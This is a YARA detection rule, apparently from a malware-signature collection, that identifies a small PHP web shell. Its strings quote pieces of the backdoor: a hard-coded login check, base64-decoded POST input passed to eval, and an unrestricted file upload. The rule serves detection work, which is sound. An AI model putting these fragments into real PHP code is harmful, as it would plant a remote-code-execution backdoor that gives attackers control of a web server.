rule contextual_2 {
  meta:
    description = "case138 - file contextual-2.php"
    author      = "Brian Laskowski"
    reference   = "https://github.com/Hestat/lw-yara"
    date        = "2018-06-23"
    hash1       = "239f1024b21e2d74f75e5e070f306fcd20055e9b209c0c5447745306193f3390"

  strings:
    $x1 = "<?php if($_GET[\"login\"]==\"25KlLN\"){$mujj = $_POST[\"z\"]; if ($mujj!=\"\") { $xsser=base64_decode($_POST[\"z0\"]); @eval(\"" ascii
    $s2 = "<?php if($_GET[\"login\"]==\"25KlLN\"){$mujj = $_POST[\"z\"]; if ($mujj!=\"\") { $xsser=base64_decode($_POST[\"z0\"]); @eval(\"" ascii
    $s3 = "xsser;\");} if(@copy($_FILES[\"file\"][\"tmp_name\"], $_FILES[\"file\"][\"name\"])) { echo \"<b>Upload Complate !!!</b><br>\"; }" ascii

  condition:
    (uint16(0) == 0x3f3c and
      filesize < 1KB and
      (1 of ($x*) and all of them)
    ) or (all of them)
}